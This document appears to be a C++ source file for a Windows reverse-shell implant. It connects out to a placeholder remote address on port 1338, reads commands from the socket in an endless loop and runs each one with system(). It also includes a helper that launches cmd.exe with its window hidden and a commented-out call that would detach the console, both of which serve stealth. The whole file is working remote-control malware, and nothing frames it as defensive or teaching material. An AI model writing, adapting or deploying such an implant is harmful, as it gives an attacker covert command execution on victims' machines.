#include <iostream>
#include <boost/asio.hpp>
#include <string>
#include <ShellAPI.h>

using namespace boost::asio;


int system_no_output(std::string command)
{
    command.insert(0, "/C ");

    SHELLEXECUTEINFOA ShExecInfo = { 0 };
    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo.hwnd = NULL;
    ShExecInfo.lpVerb = NULL;
    ShExecInfo.lpFile = "cmd.exe";
    ShExecInfo.lpParameters = command.c_str();
    ShExecInfo.lpDirectory = NULL;
    ShExecInfo.nShow = SW_HIDE;
    ShExecInfo.hInstApp = NULL;

    if (ShellExecuteExA(&ShExecInfo) == FALSE)
        return -1;

    WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

    DWORD rv;
    GetExitCodeProcess(ShExecInfo.hProcess, &rv);
    CloseHandle(ShExecInfo.hProcess);

    return rv;
}


int main()
{
    //FreeConsole();
    io_service service;
    ip::tcp::endpoint endpoint(ip::address::from_string("ip here"), 1338);
    ip::tcp::socket socket(service);
    boost::system::error_code error;
    socket.connect(endpoint, error);
    if (error) {
        std::cout << "Error: " << error.message() << std::endl;
        return 1;
    }
    std::cout << "Connected to server" << std::endl;
    while (true) {
        std::array<char, 128> buf;
        size_t len = socket.read_some(buffer(buf), error);
        if (error) {
        }
        else
        {
            std::string command(buf.data(), len);
            //std::cout << "Executing command: " << command << std::endl;
            system(command.c_str());
            //std::cout.write(buf.data(), len);

           
        }
    }
    return 0;
}
